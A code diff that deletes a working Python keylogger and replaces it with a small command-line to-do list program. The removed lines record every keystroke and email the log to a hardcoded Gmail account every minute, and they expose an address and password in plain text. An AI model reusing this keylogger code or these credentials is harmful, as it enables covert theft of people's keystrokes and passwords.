@@ -1,57 +1,34 @@
-import keyboard 
-import smtplib 
-from threading import Semaphore, Timer
-import os
 
-SEND_REPORT_EVERY = 60 
-EMAIL_ADDRESS = "harickshans@gmail.com"
-EMAIL_PASSWORD = "hacking@1234"
+import os,time
 
-class Keylogger:
-    def __init__(self, interval):
-        self.interval = interval
-        self.log = "keylogger started"
-        self.semaphore = Semaphore(0)
+print("To Do List Manager:")
+mylist = []
 
-    def callback(self, event):
-        
-        name = event.name
-        if len(name) > 1:
-            
-            if name == "space":
-                name = " "
-            elif name == "enter":
-                name = "[ENTER]\n"
-            elif name == "decimal":
-                name = "."
-            else:
-                name = name.replace(" ", "_")
-                name = f"[{name.upper()}]"
+def printlist():
+  print()
+  for item in mylist:
+    print(item)
+  print()
 
-        self.log += name
-    
-    def sendmail(self, email, password, message):
-        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
-        server.starttls()
-        server.login(email, password)
-        server.sendmail(email, email, message)
-        server.quit()
-
-    def report(self):
-    
-        if self.log:
-            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-          
-        self.log = ""
-        Timer(interval=self.interval, function=self.report).start()
-
-    def start(self):
-        keyboard.on_release(callback=self.callback)
-        self.report()
-        self.semaphore.acquire()
+while True:
+  user_input = input("Do you want to view, add, edit, or remove or exit an item from the to do list? : ")
+  if user_input == "view":
+    print(mylist)
+  elif user_input == "add":
+    ad_list = input("What do you want to add : ")
+    mylist.append(ad_list)
+  elif user_input == "remove":
+    re_list = input("What do you want to remove? : ")
+    if re_list in mylist:
+      kali = input("Are you sure you want to remove this? : ")
+      if kali == "yes":
+        mylist.remove(re_list)
+      else:
         os.system("clear")
+  elif user_input == "exit":
+    break
 
-    
-if __name__ == "__main__":
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
-    keylogger.start()
+  else:
+    print("invalid")
+    break
+
